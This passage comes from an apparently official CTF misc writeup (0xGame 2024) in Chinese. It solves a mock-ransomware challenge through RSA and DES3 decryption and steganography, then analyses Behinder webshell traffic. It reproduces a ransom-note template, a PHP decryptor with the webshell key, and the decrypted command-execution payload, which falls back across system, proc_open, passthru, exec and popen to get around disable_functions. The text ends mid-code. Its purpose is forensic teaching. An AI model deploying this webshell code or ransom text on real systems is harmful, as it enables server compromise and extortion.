irreversible data loss. Similarly, any cooperation with law enforcement agencies will result in the destruction of keys, making it impossible to recover files. :( </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTExNjYyMjMyMDc3MDI1MjcxMzk4MzA0OTUyNTUzODUyOTQ0MjM5OTgwNjM5OTExNDYwMTE1NjA0MjQ3OTE2MjU1NjUwMTc0MzAyNTU0NjMwMTk4MjEzMTAxMzk3MDQzMDk0OTYxMjc1OTQ5ODkwOTUwODg5NDM1NDM2ODg2Nzk1OTQwNzYzODY0MjI3MjUzNTQ0MDc2NzUxMTkzMzUwOTE0NjMzOTUyOTEzNTQ0MTQwMzMyNDE4NjYyMjczNzEyNTQ3OTA4OTgxNTY1MzUxNDEzNjU3NTUzMzYxNDcxNjQzOTIwMzc4ODQwOTk2NDI4NDgyMTI3MDEwNTAzMDI2MDY3NTg3MzkyMDAwMDMwNDY1Mzc3MjAzNDQzNTk3MDI3MTE4OTA3MTE2OTE1MTAyODkwOTcwNDYzNzI=</span><br></pre></td></tr></table></figure><p>最后的一行base64编码显然就是解密用的关键信息。</p><p>需要说明的是，这里用上面的方法去逆向secret.pyc会发现，我们要找的密钥是随机生成的，没法直接得到。secret.py的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line">k3y=<span class="string">b&#x27;Summer&#x27;</span>+get_random_bytes(<span class="number">18</span>)</span><br><span class="line">readme=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hello, w8nn9z! </span></span><br><span class="line"><span class="string">Your file has been encrypted! </span></span><br><span class="line"><span class="string">I have to inform you that due to my special encryption algorithm, all important files on your computer have been encrypted! This means that without a special key provided by me, you will not be able to access these files. </span></span><br><span class="line"><span class="string">To recover your files, you must follow the following steps: </span></span><br><span class="line"><span class="string">1. Pay the equivalent of $50 in Bitcoin to the designated Bitcoin address before the next Crazy Thursday. :) </span></span><br><span class="line"><span class="string">2. After payment is completed, please send the transaction ID and the string at the end of this file via email to st4rr@example.com . </span></span><br><span class="line"><span class="string">3. After receiving your payment confirmation, I will provide you with the key and the instruction on how to use it. </span></span><br><span class="line"><span class="string">If payment is not received within 72 hours, the price of the decryption instruction will double. In addition, if you attempt to recover data on your own or do not follow instructions, your files may be permanently deleted. :( </span></span><br><span class="line"><span class="string">Warning: Do not attempt to unlock files or use third-party tools on your own, as this may result in irreversible data loss. Similarly, any cooperation with law enforcement agencies will result in the destruction of keys, making it impossible to recover files. :( </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>那么来看下怎么分析这串base64编码，当然首先是解码，得到一串数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">51166223207702527139830495255385294423998063991146011560424791625565017430255463019821310139704309496127594989095088943543688679594076386422725354407675119335091463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span><br></pre></td></tr></table></figure><p>通过分析代码得到，这串数字的格式是 n的二进制长度+n+c的二进制长度+c，因此不难进行如下分段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">511</span><br><span class="line">6622320770252713983049525538529442399806399114601156042479162556501743025546301982131013970430949612759498909508894354368867959407638642272535440767511933</span><br><span class="line">509</span><br><span class="line">1463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span><br></pre></td></tr></table></figure><p>使用factordb分解一下n，这里在出题时已经提前将p和q提交到了factordb</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643080-39b31174-8565-4689-b2a2-3d634db908e8.png" alt="img"></p><p>RSA应该不必多说了，网上能找到很多教程，接下来写个脚本解密附件中的autumn.wav.encrypted</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line">p=<span class="number">64816076191920076931967680257669007967886202806676552562757735711115285212307</span></span><br><span class="line">q=<span class="number">102170960652478489355215071707263191814765888101601364955857801471459364198319</span></span><br><span class="line">n=<span class="number">6622320770252713983049525538529442399806399114601156042479162556501743025546301982131013970430949612759498909508894354368867959407638642272535440767511933</span></span><br><span class="line">c=<span class="number">1463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">65537</span>,phi)</span><br><span class="line">key=long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;autumn.wav.encrypted&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext=f.read().strip()</span><br><span class="line">    cipher = DES3.new(key, DES3.MODE_ECB)</span><br><span class="line">    padded_plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    plaintext = unpad(padded_plaintext, DES3.block_size)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;autumn.wav&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(plaintext)</span><br></pre></td></tr></table></figure><p>这样就成功得到了autumn.wav。先用010editor看一下，在文件末尾可以发现一串暂时不知道干什么用的密码</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643689-fc26364f-d01e-4a5c-aa1e-3edf7a1b967a.png" alt="img"></p><p>这里是存在deepsound的隐写，其实有些师傅看了hint就知道了。这里需要将deepsound更新到较新的版本才能提取出来。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643666-bea466c6-53da-43bc-bb04-649c47c63c9b.png" alt="img"></p><p>打开winter.txt，里面看似什么都没有，但实际上有很多空格，这个是snow隐写</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643630-c9c92b28-926c-4060-a0b6-13ae8a9e0f1d.png" alt="img"></p><p>用前面在010中得到密码提取，得到flag</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643731-98dce7bb-e92a-45de-90b2-fc02986d94b9.png" alt="img"></p><h3 id="Encrypted-file"><a href="#Encrypted-file" class="headerlink" title="Encrypted file"></a>Encrypted file</h3><p>附件给了一个 <code>secret.php</code> 和一个 <code>Behinder.pcapng</code>，php打开是乱码还不知道有什么用先放一边，先分析流量包，搜搜文件名就大概可以知道是冰蝎流量，网上有很多资料可以参考</p><p>流量前面一大段都是用 <code>dirsearch</code>在扫目录，可以发现攻击者找到一个<code>upload.php</code>，之后就是经典的冰蝎流量分析：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644244-3435aa47-cc8c-47c9-a80e-da9e4e18f585.png" alt="img"></p><p>上传的 <code>shell.php</code> 的作用是对后续的攻击命令进行解密并执行，可以直接用于解密流量里的攻击命令，第一段和第二段分别是在进行密钥协商和返回phpinfo()的命令回显，可以直接从第三段开始往后进行分析</p><p>以第三段为例，直接用流量里的 <code>shell.php</code> 进行解密：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$after</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$after</span>[<span class="variable">$i</span>] = <span class="variable">$after</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;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&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">Decrypt</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果即执行的命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSafeStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s1</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$s0</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$s1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s0</span> == <span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$cmd</span>,<span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$PadtJn</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[, ]+/&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span> !== <span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">strtolower</span>(PHP_OS), <span class="string">&#x27;win&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$JueQDBH</span> = <span class="string">&#x27;is_callable&#x27;</span>;</span><br><span class="line">    <span class="variable">$Bvce</span> = <span class="string">&#x27;in_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;system&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;proc_open&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;proc_open&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;r&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ), <span class="variable">$pipes</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;passthru&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;passthru&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;shell_exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;shell_exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$kWJW</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="variable">$kWJW</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;popen&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ 